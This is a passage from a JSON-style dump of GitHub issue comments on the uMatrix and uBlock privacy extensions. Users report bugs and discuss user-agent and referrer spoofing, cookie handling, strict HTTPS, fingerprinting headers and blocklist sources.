just updated to that version yesterday. Thank you.\n. ",
    "ghost": "Okay, I understand, and I agree that the site's design is rather antiquated. Thus, the problem shouldn't occur too often. I'm curious to see the effects of your fix. Thanks for digging into it!\n. Could you please expand on 2? I'm curious if you see something different than I do:\n\nI can confirm 4, hyperlink audits do appear to not be logged while 'disable hyperlink auditing' in the privacy tab is enabled. \n. Ah the key word I glossed over was >translated<, my apologies @tailHey!\n. I believe this could be accomplished later to appeal to a wider audience when you're close to a 1.x release, though I must state that this is just my opinion.\nBy the way, excellent work @gorhill! Loving the changes thus far!\n. A small enhancement proposal.\n\nThe puzzle-piece menu currently offers no way to disable a recipe. One must open the Dashboard, find all the entries involved and delete them. It would be nice if we could toggle a recipe on and off straight from the menu.\nThe padlock buttons next to recipes names are redundant, since the changes are immediately reflected in the global padlock button and it could be used instead.\n\n. Ah I see, thank you for clarification! Is there anything inherently negative about importing a pattern-based filtering list into uMatrix myself? I haven't noticed any odd behavior yet, but I've only just installed uMatrix.\nEdit: I should have thought more before asking, my apologies. It all comes down to preference I suppose, and I don't think you could have been much more fair in this decision as the uMatrix / uBlock / uMatrix+uBlock argument became a personal choice. \nEdit 2: Read through the wiki and discovered:\nAll hostnames in selected hosts files are interpreted as blacklisted hostnames \nin the global scope, so they propagate to narrower scopes just like in HTTPSB.\nSo fundamentally there is little to no difference, other than some of the extra features offered by uBlock such as element hiding, a larger list of available filters, more terse scoped rules, etc.\nUnless I've mistaken something, feel free to close this ticket unless you think this question might be asked again, and should serve as a resource to curb similar queries.\n. In \u00b5Matrix - see above. I Chrome I allowed permament cookies for crowdin.com but block 3rd party cookies. Perhaps that's the problem as cloudfront.net might require cookies, too?\n. I think I haven't seen crowdin.net in \u00b5Matrix so far. This is how it looks for me:\n\nI've now allowed cookies for cloudfront.net. Will see how this works out.\n. I just saw that allowing cookies for cloudfront.net didn't help either.\n. Perhaps. That's also blocked in \u00b5Block.\n. No, it's not. I was logged out again although I had mc.yandex.ru allowed in \u00b5Matrix and \u00b5Block was disabled. Must be something else ...\n. Yes, same here. If this is really the culprit - what would be the consequence? Is an exception list necessary for UA-spoofing?\nEDIT: Or would it be possible that \u00b5Matrix does not apply a new UA for sites currently loaded in a tab? I.e, only for newly loaded sites?\n. While we're on it ... I remember that I was logged out from some other sites (among them 1 banking site) in the past - only rarely, but it happened. I had never related those problems to UA-spoofing but those exmples may confirm that other sites use this technique, too. \nAnd you're absolutely right: The best solution is a per-scope-switch, of course.\n. I cannot confirm. The remaining tab is reloaded but the tab's badge remains grey, indeed. And wired.com is in statistics here.\n. Okay, finished. I think you delivered a nice text, Raymond. Just one point of criticism: Perhaps one or two more sentences about scopes would be useful. Right now a newbie won't get the importance of scopes, IMHO. A comprehensive description is, of course, not possible in such a short description.\n. For my global scope I have 'all' set to block everything aside from css & img. My site-specific scopes have been removed.\nFor instance when visiting github with these settings, I see the \"github is blocked by uMatrix\" message rather than the enabled CSS/Images.\n. I visited tomshardware to see if this was limited to certain domains, but I still have the same issue. Without using the 'allow 1st party' scope with my previously mentioned settings it appears all content is blocked. \nI'm using the extension via the Chrome web store atm.\n. \nWith all rules removed:\n- Set 'all' to disabled, force-allow 'css' and 'image'\nWith no site-specific settings (and 'allow 1st party' disabled) all domains appear to be blocked.\n. Yep that was it! /facepalm\nIn a previous config I didn't remember seeing it, though that may be incompetence on my part. Thank you for your time @gorhill \n. There is an extension on GitHub called Chameleon, that besides some\ntracker stuff that doesn't actually work, it masks your browser to\nmatch Tor Browser (because everyone using that has the same stuff).\nCurrently I use a UA changing extension instead of uMatrix, and I can\nset that very same User-Agent (the most common one for Tor is simply\nFirefox 24 on Windows 7 x86).\nBut my HTTP_ACCEPT is different and that pre-alpha buggy extension is\nable to change it to the Tor Browser equivalent.\nOn 11/11/14, Raymond Hill notifications@github.com wrote:\n\nThrough email:\n\nFor further anonymization, and because User agents are, for most people\n(not me since I am always on the latest version of Chromium x64\u200b, very\nidentifiable\u200b), obsolete\u200b (unless they use a nightly or obscure browser)\u200b,\nit\u200b is\u200b important to\u200b have the ability to\u200b modify HTTP_ACCEPT headers\u200b\n(especially for people who live in smaller countries), assuming this is\npossible\u200b. Though having the option of cycling it from a list every n\nminutes would be great as well.\n\u200bI would recommend the following to be the default, to more effectively\ncrack down on the usage of fingerprinting tools:\n\"accept_encoding\":\"gzip,deflate,sdch\",\n\"accept_default\":\"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8\",\n\"accept_lang\":\"en-US,en;q=0.8\",\n\nWill have to think carefully about this. Just a single whitespace, missing\nor not, is enough to make one browser stand out among others. I don't have\naccess to any stats regarding strings in widespread use, so it is a bit\ndifficult here to work in blind mode.\nMy earlier thoughts on this is that the HTTP_ACCEPT header should be tightly\ncoupled with the UA string, and to support the ability to add a suffix\nstring to the candidate UA strings, which suffix, if present, would be used\nfor the HTTP_ACCEPT header.\n\nReply to this email directly or view it on GitHub:\nhttps://github.com/gorhill/uMatrix/issues/55\n. Okay, I see. Sorry!\n. Is there, by any chance, instead of making it a simple send referrer/don't\nsend anything, a third option to send that domain (probably the full\ndomain, and the root domain)?\n\nI use a separate addon, and all sites seem to be fixable either by sending\nthe page it's own referrer (a site that lets you download, but prevents\nlinking that link on other sites, so you have to land on that page then\nclick the link), and other things like TypeKit fonts must send the active\npage.\nThat still lets you beat tracking, but those two extra options let you fix\nwithout giving that site the ability to tell where you came from.\nThe add-on I use is called Referer Control, and the two options in it are\nTARGET_HOST and REFERER_HOST.\nHaving that option would probably allow me to bin that addon outright,\nbecause all my site fixes except one (that uses TARGET_HOST) work via\nsending REFERER_HOST. All other sites I block by default. The REFERER_HOST\nseems to fix damn near all sites I've been on, and I believe it just tells\nthat site that it is the referer, which is harmless as you aren't leaking\npast web history to the site.\nOn Wed, Nov 19, 2014 at 10:32 AM, Raymond Hill notifications@github.com\nwrote:\n\nI will transform the current referrer removal setting into a per-scope\nswitch, with no complicated logic. So a user could enable referrer removal\nin global scope, thus it applies everywhere, and if ever a site breaks due\nto referrer removal, then it would just be a matter of disabling referrer\nremoval for that one scope.\n\u2014\nReply to this email directly or view it on GitHub\nhttps://github.com/gorhill/uMatrix/issues/59#issuecomment-63657595.\n. There was a Firefox extension called Clean Links, but last I remember\nit dealt with embedded onclick vs binded JS in other JS, but I guess\nthe extension could override other stuff.\n\nIt is one of the few security FF extensions I have no Chrome equivalent to.\nOn 11/19/14, Quurks notifications@github.com wrote:\n\nThis might be simple, this might be impossible:\nGoogle, Facebook, (and possibly others) are changing href of links when they\nare clicked, to be able to track link clicks. It might be possible to block\nthis behaviour\nhttps://nakedsecurity.sophos.com/2013/03/26/anatomy-of-a-feature-change-link-after-clicking/\nExample:\nGoogle results for \u00b5Block:\nWhat \u00b5Block can and can not (currently) do (hover url points to github)\nOn click or on copy link location url turns into\nhttps://www.google.de/url?sa=t&[...]\n\nReply to this email directly or view it on GitHub:\nhttps://github.com/gorhill/uMatrix/issues/60\n. Isn't this the same as Hyperlink Auditing? If so, it's already covered\nby \u00b5Matrix.\n. You mean navigator.userAgent cannot be spoofed? Damn, and I just\nadjusted some userscripts to use that instead of their own hardcoded\nstrings, because that solved TamperMonkey getting the extension\nconflict due to my other add-on setting the UA.\n\nOn 11/20/14, Raymond Hill notifications@github.com wrote:\n\nSo currently, UA spoofing is rendered rather useless, unless one disable\njavascript by default, which is not a very realistic workaround.\n\nReply to this email directly or view it on GitHub:\nhttps://github.com/gorhill/uMatrix/issues/61#issuecomment-63799393\n. I'm not sure if this would add too much complexity or feature bloat, but it would be nice if we could do Strict HTTPS per request type.\n\nCurrently I've got Strict HTTPS on by default, as I like to use the harshest blacklisting possible, but some sites I toggle it off just for a few piddly images, and expose myself to less secure JS as a result.\nFor example I disabled it on Super User and Apple, because of image loss.\n. Oh, yeah I forgot about that icon.\nAnyway, If a user hypothetically disabled that with the appropriate\nflag, would Strict HTTPS on block both Active and Passive content, or\njust Passive?\nOn 12/18/14, Raymond Hill notifications@github.com wrote:\n\n\nexpose myself to less secure JS as a result\n\nNo, the browser will block \"active\" mixed content: javascript is considered\nactive mixed content. There will be an icon in the address bar, which can be\nused to allow. The benefit of Strict HTTPS is to be more hardcore than the\nbrowser, as it will also block passive mixed content.\n\nReply to this email directly or view it on GitHub:\nhttps://github.com/gorhill/uMatrix/issues/67#issuecomment-67506661\n. I'd like to add to this, that I use Referer Control. The behavior of uMatrix seems to be to send that site's Referer, because Referer tests change from Google Search to that site.\n\nI set that addon to do that (just send REFERER_HOST for all sites), and TypeKit fonts work.\n. Is there any way within the context of uMatrix to make this work?\nOtherwise I\u2019m just going to have to globally disable it and keep using the\nother add-on for now.\nOn Sun, Nov 23, 2014 at 11:24 AM, Raymond Hill notifications@github.com\nwrote:\n\ndoes not seem to work [...] It only works if whitelisting the actual site\nyou are on.\nIt's not a bug, it's how the feature works: See Per scope switches\nhttps://github.com/gorhill/uMatrix/wiki/Per-scope-switches:\nallow a user to customize various settings for a specific scope\n\u2014\nReply to this email directly or view it on GitHub\nhttps://github.com/gorhill/uMatrix/issues/68#issuecomment-64123576.\n. I disabled it globally a long time ago to fix that, as I spoof all sites with RefControl.\n\nSent from my iPhone 6 Plus\n\nOn Jan 23, 2015, at 11:30 AM, Matt Shen notifications@github.com wrote:\n@CODYQX4 Open the \"per scope switch\" menu and turn off \"Referer spoofing\". That removes the conflict with Referer Control. Don't forget to save changes to the scope!\n\u2014\nReply to this email directly or view it on GitHub.\n. @gorhill : I understand your reasoning. On the other hand, Noscript has more than 2 million users! Now considering that\n- uMatrix offers much more than Noscript\n- Noscript is not yet E10s compatible (and it's unclear when it will be) and not yet restartless\n- Firefox users are traditionally more privacy aware than Chrome users\n\nchances are that a Firefox version of uMatrix might get much more attraction than you think. Just my 2 cents ;-)\n. I'm sorry but I'm unable to understand the implications of this solution. Does it address the problems mentioned here?\n. Sorry, I'm confused. From my limited understanding, the issue is not related to how a cookie is created/removed/modified (be it by a HTTP header or by javascript using the document.cookie property). Please correct me if I'm wrong.\n. Yes, that's an example of a real issue...\nHowever, I'm still too stupid to understand what you're looking for so I better opt out here. I'll see what you're going to implement anyhow ;-)\n. If you do need this feature, and I myself like having this option...\nI use https://chrome.google.com/webstore/detail/user-agent-switcher-for-c/djflhoibgkdhkhhcedjiklpkjnoahfmg for User-Agent per domain.\nI also use https://chrome.google.com/webstore/detail/djflhoibgkdhkhhcedjiklpkjnoahfmg for Referers.\nYou'll want to completely disable the uMatrix options for spoofing those, as well as any extension (I disabled TamperMonkey from modifying headers, because I have scripts that set their own Referer and UA and you get extension conflicts). If you run them both, they will conflict and the last installed extension wins and chrome will have an orange menu indicating the error.\nI'd love to have these options under one shop, sure, but there are ways and means to still configure the browser this way with the right add-on configuration.\nI'm not at the moment actually spoofing my UA anywhere, but I use the Referer thing to TARGET_HOST all domains except font domains that break otherwise (EX: TypeKit).\n. Yeah, I can't think of any good place to put it in the UI if you did\ndecide to add that anyway.\nOn 1/19/15, Raymond Hill notifications@github.com wrote:\n\n\nI'd love to have these options under one shop\n\nThe requested feature here makes sense for an add-on which specializes in\nspoofing UA. It does not fit at all for uMatrix, which primary purpose is\nthe matrix as per UI and filtering engine.\n\nReply to this email directly or view it on GitHub:\nhttps://github.com/gorhill/uMatrix/issues/105#issuecomment-70520871\n. I assume that this suggestion is meant to show such a list by hovering\nthe cursor over a specific cell. We had discussed such an idea in the\npast already. I remember that you declined it for performance reasons.\n. @p-b-- \nthat does not really allow me to block all third party cells by policy. So if you look at my earlier example, what I want to be able to do is blanket block stuff for all \"3rd party\" hosts, but not for the 1st-party.\n\nI'm not sure that I understand. IMO, just block everything except 1st-party in the global scope and you'll get what you want.\n. More info here #73\n. with master uMatrix or a version pre 0.8.1.3 ?\nEDIT: they work fine for me with master uMatrix and Chromium Version 40.0.2214.91 (64-bit)\n. I'm putting this here as a reminder: https://www.browserleaks.com/webrtc\nHope that's okay with you guys :)\n. @mailinglists35 \nhttps://github.com/CODYQX4/WebRTC-Multiple-Routes\nThat is a working extension, and some didn't take note there, that it can require a browser restart for that to take effect. My extension lets you toggle and restarts automatically.\nJust a temporary use until they get this feature properly integrated into settings.\n. Well, there is none. However, if you make a backup of your rules in HTTPSB and open the generated text file while you're surfing your favorite websites with \u00b5Matrix, it's much easier and faster to determine which cells have to be whitelisted. This simplifies the migration to \u00b5Matrix.\n. Not related to uMatrix.\n. Okay, I just remembered our discussion here. The chromium-extension-scheme is also available in uMatrix. I disabled the Chrome PDF viewer and installed the PDF Viewer extension. After allowing XHR it works. \nWhat do you think of this? A viable alternative?\n. Thanks! Unfortunately the chromium-extension-scheme is nowhere documented as far as I know. Is it possible that other extensions will be negatively affected if, say, only the XHR column therein is whitelisted?\n. I see. What's still unclear to me is. What exactly does the chromium-extension-scheme or, in other words: How does it differ from the behind-the-scene matrix?\n. Now that you saying this it seems obvious ;-)\nThanks again!\n. Aargghh - how embarrassing ... I must have had a blackout ...\n. Sure:\nhttps://zeustracker.abuse.ch/blocklist.php?download=hostfile\nhttps://zeustracker.abuse.ch/blocklist.php?download=badips\nhttps://zeustracker.abuse.ch/blocklist.php?download=domainblocklist\nhttps://zeustracker.abuse.ch/blocklist.php?download=ipblocklist\nhttps://zeustracker.abuse.ch/blocklist.php?download=compromised\n. I just noticed that there is also a problem in the Chrome version: If I disable dev3 and enable it again I have to click the apply button in order to make the new hosts files work. They are still shown but with \"0 used out of ...\". Obviously those settings are not remembered by uMatrix.\n. I've tried several sites. On some sites it works (e.g. for Gmail), on some other sites it doesn't. I will try to find a reason for this.\n. Couldn't find anything, still investigating ...\n. Here's an example to illustrate my point. Load\nhttps://www.deka.de/privatkunden\nwith Chrome and uMatrix 0.8.1.3. This is how it looks:\n\nThere is a button called \"Depotzugang\" at the top of the site. If you click it the site looks like this:\n\nNow the login fields can be filled out by Lastpass. No problem.\nNow load the site with uMatrix 0.9.0.0-dev6:\n\n4 things are different compared to 0.8.1.3:\n1. You'll notice that the big image (below PERSPEKTIVEN PRODUKTE ...) is not displayed.\n2. In the matrix there is no line for stats.deka.de and it does not appear in the logger, either.\n3. In the Chrome address line there is now a button that says that javascript is blocked for this site.\n4. If you click the button \"Depotzugang\" at the top of the site nothing happens, hence the login fields cannot be filled by Lastpass.\nIn both versions the following rules were used:\ndeka.de deka.de cookie allow\ndeka.de www.deka.de cookie allow\ndeka.de www.deka.de script allow\ndeka.de www.deka.de xhr allow\nand\ndeka.de stats.deka.de * block\nin 0.8.1.3 only since that subdomain didn't even show up in 0.9.0.0.\nPlease note that I can not observe this behaviour in the Firefox version. Only the Chrome versions seem to behave rather differently. \nAll settings were identical. \n. > Ok, this must be it. With 0.9.0.0, I completely removed mingling with user settings, so if you have custom javascript rules (the browser ones), uMatrix 0.9.0.0 won't override them.\nAha! That's interesting. I had, indeed, some custom javascript rules created in the old ages before HTTPSB but none related to deka.de. However, I had javascript blocked by default in Chrome as it hadn't mattered before. Now after allowing javascript by default above problems are gone. I just wonder why not all websites were affected if that was the culprit.\nIn any case this should be prominently communicated as this is an important change which might affect many users.\n. I guess so ;-)\n. Similar results on \nhttp://www.javatester.org/javascript.html\nand\nhttp://sveinbjorn.org/check_if_javascript_is_enabled\nFirefox: JS enabled and Chrome: JS disabled on both sites.\n. No problems here. Perhaps cookies are blocked in the Firefox settings or through another extension?\nWhat's different for me: \n1. If I enter github.com/session I'm directed to github.com/login\n2. In the matrix there is also a line for api.github.com where I see a number in the XHR column (which I allowed)\n3. I also see a number in the CSS column for assets-cdn.github.com\n. Here we go:\nThe following 3 screenshots represent the log if the site is loaded:\n\n\n\nAnd once I click the play button in the video I get this:\n\n. One general question: Do you know a trick how to make a screenshot of the matrix in Firefox? Other than in Chrome it vanishes too fast when I press the print key which starts ksnapshot in my case since I'm using KDE. (I'm not talking about the sticky matrix in the logger.)\n. \nI'm using dev7.\n. > No uMatrix version number.\n\nThe amount of behind-the-scene requests resemble what was happening with uMatrix dev.0. I can't get this kind of output. Now you say dev.7, but is it dev.7 for the last test, or dev.7 for the first test too?\n\n\nFor all tests dev7.\n\nNo Firefox version.\n\n37.0.2 64bit on Arch Linux\n\nThe screenshot you provided in OP is truncated, I can't see the most important information, which is the entries immediately following the doc boundary for the link you provided.\n\nOkay, here is the complete log for that site.\n\n\n\n\nReading again, I am not even sure what the exact issue is. You gave me a URL, I loaded that URL and all work as expected, the matrix is filled with information.\n\nAs shown in the screenshot \nhttp://video.spiegel.de/flash/74/54/1574547_1024x576_H264_HQ.mp4{inline_script} is blocked according to the logger but there is no corresponding entry in the matrix.\n\nTranscribing the relevant rules/switches in use helps a lot too.\n\nThe rules for spiegel.de as shown in the screenshot. My settings:\n\nand all hosts files enabled.\n. I apologize. These are my rules:\nspiegel.de spiegel.de plugin allow\nspiegel.de video.spiegel.de frame allow\nspiegel.de www.spiegel.de frame allow\nspiegel.de www.spiegel.de script allow\nspiegel.de www.spiegel.de xhr allow\nNow with dev9 there is a change indeed: The logger doesn't show a blocked inline script anymore.\n\n\nHow is your video playing? Mine won't play without Flash.\n\nNeither does mine:\n\n. >  I don't get that dialog box. This explains everything.\nSorry for not mentioning this earlier. I failed to see that this is responsible for a script that is blocked in the logger but not reported in the matrix.\n. Hm, what else can I provide?\n. I have no idea. I tried it with uMatrix and uBlock0 disabled but with the same result. So it's definitely not related to something being blocked by those extensions.\n. @SkySkimmer : Wow, this works really great! Such an easy solution - and I had not noticed it ...\nThanks a lot!\n. > For now collapse the blacklist section\nThanks, that worked! Feel free to close this issue if you have a respective todo item anyway.\n. See https://github.com/gorhill/uBlock/issues/112.\n. Alright, sorry, and thanks for reply.\n. Thank you for this!  Although, the frame placeholder was one I had customised.\nJust having the little up arrow as a link was very small for me, so I had moved the URL inside the <a> tag, then gave it display: block; height: 100%; styling, so the entire area of the placeholder was clickable.  Of course, I can always modify the add-on itself locally, so it's not a big deal.\n. Not on my system:\n\n. > Was it the first new tab you opened?\nYes!\n. As already said, I haven't seen this in my system (FF 37.0.2).\n. Aside from this problem I think there are two other ones.\n1. That little triangle is hard to detect.\n2. Many users will not understand why github.com is collapsed and api.github.com is visible but live.github.com is hidden. I guess that's confusing. \n. I tried again, and I couldn't reproduce, either. \nRegarding those collapsed lines in HTTPSB: Hm, now that you're mentioning it I remember. However, up to 0.8.1.3  I think I haven't really noticed it. Is it possible that the unfolded status was the default then?\nBut perhaps this is another example (among others) that I'm getting senile. Thus, my collaboration makes less and less sense. I'm ringing down the curtain on it. \nThanks a lot for your great extensions and all the best for you.\n. True, although in the case of redirect feed sites, that basically just redirect you server side, it in that case really isn't relevant in the case of the Matrix.\nI usually get caught up on this on things like that, when content is locked behind such a technique and I have no way to bypass it.\nMacUpdate is notorious for click throughs solely to track clicks.\n. Thanks.\n. By the way, please update the extension on Opera store. It's still at version 0.8.1.4. uBlock too, please.\n. Redacted\nSee @CrisBRM's answer\n. in Chromium   58.0.3018.0 (Developer Build) (64-bit)\n\"Use a prediction service to load pages more quickly\" is always shown as set to on if either uMatrix or uBlock Origin extensions are Enabled. It's probably a chromium bug.\nscreenshot: https://bugs.chromium.org/p/chromium/issues/detail?id=658618#c6\n. Looks like it's about to get fixed: https://bugs.chromium.org/p/chromium/issues/detail?id=693301#c4\n<3\n. The uBlock eliminated the frame of the page and left the black background while the uMatrix not.\nThis is normal?\n. Bull\u00b4s eye!\nThanks!\n. CrisBRM, that did it. Thanks. Also thanks gorhill for this fine extension. It's replaced no-script and adblock.\nEnabling \"other\" for the site or even all doesn't seem to work though but using CrisBRM's suggestion did. I'll just leave \"other\" enabled for all unless it's a security vulnerability.\n. This is really similar to the functionality of temporary whitelisting + 'Delete non-blocked session cookies X minutes after the last time they have been used', though the latter could probably be modified to also check if the tab is open before deleting the cookies.\nAn alternative would be to outright clean session cookies and etc when the tab is closed, though this can be (jokingly) accomplished by using windows instead of tabs and set Firefox to clear on exit. Chrom* doesn't have this ability iirc, and having differences between browsers is something I believe @gorhill is trying to avoid.\n. gorhill/uBlock#112 related.\n. This looks solvable, on Chromium at least. The contentSettings.javascript API there is what determines whether <noscript> tags are run or not; right now uMatrix is just setting a blanket allow-all in it and doing fine-grained settings via injecting CSP headers, which aren't the same thing. This is correct behaviour according to the standard so we can't simply go tell the browsers to suck less.\nNow, it seems obvious that the native API isn't going to work for every case or else it would've been used from the start, but I can see it working fine for simple cases where everything in a site's \"script\" column would be red anyway. I'm not interested in checking myself, but a similar method might work in Firefox's permissions system too. It might even end up a tiny bit more efficient if it can cause the browser to avoid pre-emptively setting up a script environment for the page.\n. @gorhill: I understand what you're saying: the browser settings only get applied one time when the tab first loads and they can't know about embedded content to whitelist in advance. But please don't dismiss it offhand for that, I wasn't asking for something impossible.\nI don't mean that it should replace the current script settings, but be used in addition to them. The CSP-based filtering code doesn't need to change at all; as long as the browser whitelist contains (at least) every domain scope that's whitelisted in the extension for active content (including *) it should continue to function the same as it does now.\nIt might behave slightly differently \u2014 that's the whole point of the bug report \u2014 but I can't think of any situations where it'd add breakage except contrived ones (like whitelisting a site that relies entirely on self-contained onclick handlers, and then trying to use it without reloading). It'd make it a little harder for pages to detect when someone has this installed, too.\n(If I'm being dumb and this really is impossible for some reason, can we at least have an option to unlock the browser JS settings and do it manually?)\n. This is a very concerning change on behalf of the Chrome devs.\nWithout this feature, there's no way at all to block extension requests, which all too commonly embed Google Analytics and even outright malware.\nShort of inspecting every line of code for every extension (and I have a lot of them), for every update, there's no way to stop it. I could analyze the code but that is a massive burden on top of what I already do. Giving them no rights to begin with + Chrome's sandbox was a much better option. Blocking is always better than allowing everything and then trying to catch abuse and patch it one incident at a time.\nMeanwhile, Firefox may very well go this route. Who knows what their new API will allow in the future?\n. This was most likely due to a bug in Firefox affecting icons with badges. If so, it should be fixed with Firefox 42.\n. What happens if you switch-spoof their user agents?\n. Sorry, did not mean to imply UA spoofing was already on. I was merely trying to suggest turning it on, and making each FF instance pretend it's the other one :)\n. I might be having the same issue. For me, it happens when I do (right click on the tab and the select the) Move to New Window, for example while watching a youtube video. It seems to be working okay (in the new window) but then trying to add that video to a (youtube) playlist or even sharing it(clicking Share) gets stuck and it seems to be because of this:\n\n\nBoth uBlock and uMatrix are detecting the currently open site(the one in the New Window) wrongly, so everything(new) is thus denied, which explains stuff not working anymore.\nuMatrix 96ffb97a34a7550a912bfa2339cfd94403718b23\nuBlock 5cac23dfd7def3cd44c80080692b18b8953d31b9\nFirefox 42.0 https://gist.github.com/zazdxscf/51ea4c46e7fd0e2391c8\nHopefully you won't need my uMatrix config to reproduce...\nEDIT: as a minimum:\nhttps-strict: * true\nmatrix-off: about-scheme false\nmatrix-off: behind-the-scene false\nmatrix-off: chrome-extension-scheme false\nmatrix-off: chrome-scheme false\nmatrix-off: localhost false\nmatrix-off: opera-scheme false\n* * * block\n. Using the steps from above and performing the google search for \"test\" and clicking the wiki link for \"Test\", the scope is correct for me(eg. en.wikipedia.org). (NOTE: it does open in the same tab, not a new tab or window; this depends on your google search settings)\n However google.com cookies/requests appear there. (see pic1)\n Refreshing the page (click or shift+click, or uMatrix's reload button, or press Enter in the address bar Alt+D) doesn't change anything in the matrix, and a cleared uMatrix log will show all those requests (eg. to read google's cookies) are being executed again with each refresh. (see pic2) [this might be important]\n Opening a new tab however and pasting the current link ( https://en.wikipedia.org/wiki/Test ) will show the expected matrix. (see pic3)\nCan also reproduce this by google searching for eg. \"Wired-Marker\" then visiting the search result leading to https://addons.mozilla.org/en-US/firefox/addon/wired-marker/ You'll see google.com cookies and www.google.com requests in uMatrix while you're on that page. (the scope is still correct however)\nFirefox 44.0 (dev.ed.)on gentoo linux\nuMatrix commit: 3150395375acf28ab6644469ba98f6945f3e2db6\nuBlock Origin commit: 98b0967d69a6d1403268b4514155e25ca8b33115\nNoScript 2.9.0.3\nhttps-everywhere commit: 7095f5a7af10c68076227c848e8b0d08796bd94c\npic1:\n\npic2:\n\npic3:\n\nEDIT: So how come the clicked google search result webpage(target site) has such an intimate 3-way symbiosis with google and firefox such that refreshing the target site still notifies google? I'm assuming the target site cannot access google cookies anyway (but I don't have the know-how to test if ff enforces that in the current case)\nEDIT2: actually, on each refresh, only the cookies are logged in uMatrix log, there are no requests logged, even though the matrix shows some(non-cookies) requests too! I'm confused. What (leftover?)script is trying to access those cookies? and why is that script still running? seems like a firefox thing, maybe a feature even. (or it's not a script but rather some request(which sends the cookies with it automatically) - heck I dno how cookies work)\n. Facebook.com: everytime, Firefox 64bit, uMatrix with defaults, adblock lists refreshed, cahed deleted\n. Awesome, thanks. Didn't even know about that. I must be tired because I completely missed the Dashboard from the preferences section.\n. Why? So that's like 3 clicks now. Even more work.\n. So what's the status for a shortcut to temp disable 'all' + 'iframe' with a keybord shortcut?\n. necro but its important info people need which you cant find anywhere by using google(untill now hopefully)\nthis was so simple it makes we want to cry, and im gonna call the creator of umatrix a retard for doing it this way cus its idiotic and makes people uninstall before noticing. atleast i almost did untill i noticed how simple it was.\nhow to unblock a site if umatrix blocks it (just for the search for solution)\nif a site or page gets blocked\n\nwhat you do is just on the same page you disable the matrix for the current scoop and then you can save it to perm if you whant\n\nthen you can just restart and its all fine\n. Hi! Im not sure but Its possible to modify the about.js file in uMatrix-master/src/js/ ? \n. Im pretty sure is the browser configuration and the DE, not uMatrix, Im using Firefox in Debian with Stylish and seems like this: http://imgur.com/a/GDaEE\n. @gorhill or anybody can close this issue? Its already solved.\n. Why you just dont try modify the javascript.enable=false preference inside the about:config ? \n. Can you test with .trade domain? E.g. poe.trade It has the subdomain.cloudfront.net called\n. Why it's blacklisted? Which filter?\n. So then how do you know it is even blocked by any blocklist at all\n. Simple docu would solve all of this.\nCheers\n. @Atavic matrix-off: behind-the-scene true is the default setting. So by \"changing\" you mean setting it to \"false\"?. OK, that didn't help.... What do you mean by lower layers?. @gorhill  I have read the readme and thats why I am not opening  a new feature request. I know you dont have time for new feature request but please read this with an open mind and in future if ever you get time please consider this.\nI am a biggest fan of RAS addon especially because of its wide selection of useragents list from mobiles to desktops and from linux to firefoxOS but because of API issue RAS will not be developed further from firefox quantum version onwards. While searcing somebody recommended your addons which can change useragents but dont have the list of useragenst. I would like a similar list of useragents like RAS in uMatrix and believe it would be a good addition for privacy for users.. Sure is nice to rule with an iron fist and decline comment-less. Whatever.. Would you introduce the same feature you implemented for uBO (https://github.com/gorhill/uBlock/issues/2550) also for uMatrix? :-). > uBO does not work differently.\nIf I set a rule in uBO while in incognito mode and then close the incognito mode the rule does not show up in \"My rules\" of uBO, i.e. it does not propagate from incognito to normal. This report suggests that it would be good to be able to set incognito-only volatile rules as it is currently possible for uBO.\nI hope that clarifies.. The STR is:\n\nInstall http://www.kimai.org/ on a local web server\nSet uMatrix to Delete non-blocked session cookies after N minutes.\nLog-in to kimai and disable uMatrix for its scope and refresh the page\nWait N minutes\nRefresh kimai\n\nExpected: user should stay logged in\nActual: user is logged out (cookies auto deleted). Is it possible to make uMatrix work in sync with browser settings?\nExample: if all cookies are blocked by default and the user enables them for a particular site (through uMatrix) uMatrix to propagate this setting to the browser settings too (add an exception for current session or permanently, depending on if the the rule is \"commited\"). And if the rule is removed from uMatrix - to remove the exception.. > Use Chromium custom buit from https://chromium.woolyss.com/\nI believe that's what I am using:\nhttps://en.opensuse.org/Chromium\nIs there any evidence that the version you recommend is better (privacy-wise)?. well,\n1. Linux Firefox 57 (last pic user agent)\n2. open your brower, enter http://archive.is, click in umatrix and open logger, back to the tab archive.is an enter for ex: google.com, go back to the logger and see how favicon is red (suppose to be blocked) but if you view the source page is not, more, if you run tcpdump or wireshark can view the request.\n3. there is nothing to transcribe, is a practical example\n4. pics self explain the problem, but is you need text is here\n. Not a great solution, but you can disable firefox favicon request by about:config:\nbrowser.chrome.favicons = false\nbrowser.chrome.site_icons = false\n. Could be a browser bug:\nhttps://bugs.chromium.org/p/chromium/issues/detail?id=795827. Here is my a report (for something else about cookies) in which I mentioned uMatrix:\nhttps://bugs.chromium.org/p/chromium/issues/detail?id=775080\nHowever I am still unable to pin for sure if it has anything to do with uMatrix because it seems difficult to find a patter. At first I thought it is the browser (because with v.63 everything worked fine). Then I thought uM may not be working correctly with v.64 so I disabled cookie clearing. But after a few restarts the issue with logins not surviving appeared again (and it seems - not for every site). Then I got a reply in the bug report linking to the other bug.\nSo considering that it is difficult to detect a pattern uM may or it may not have any relation to all that. In any case perhaps it is wiser to wait for the browser bug to be fixed and then test again.\nWhat do you say?. ",
    "tailHey": "@wzsk: You're mistaking for 2, look at the top of this tab, above buttons like Commit, Revert, Edit and on. You'll see two bold strings, Permanent rules and Temporary rules. Your screenshot is about rules themselves, and rules aren't meant to be translated so that the addon can deal with syntax properly.\n. @gorhill : About 4: I don't have any URL to test it, it's just that I neved observed another number than 0 for it since the very first alpha build of \u00b5Matrix.\nBTW I just submitted a translation improvement for the behind the scenes requests text, maybe you could use it to make a smaller, sharper explanation in English?\nThank you\n. ",
    "jimbo1qaz": "New idea: Some sites integrate with Google Drive or Github. Is it possible to \"inherit\" rules from other domains? So if a web-app integrates with Drive, you can have it inherit Google Drive privileges and communicate unhindered?\nThis is just an idea, I haven't fully thought it out yet (how it interacts with global or 1st-party rules, etc.)\n. ",
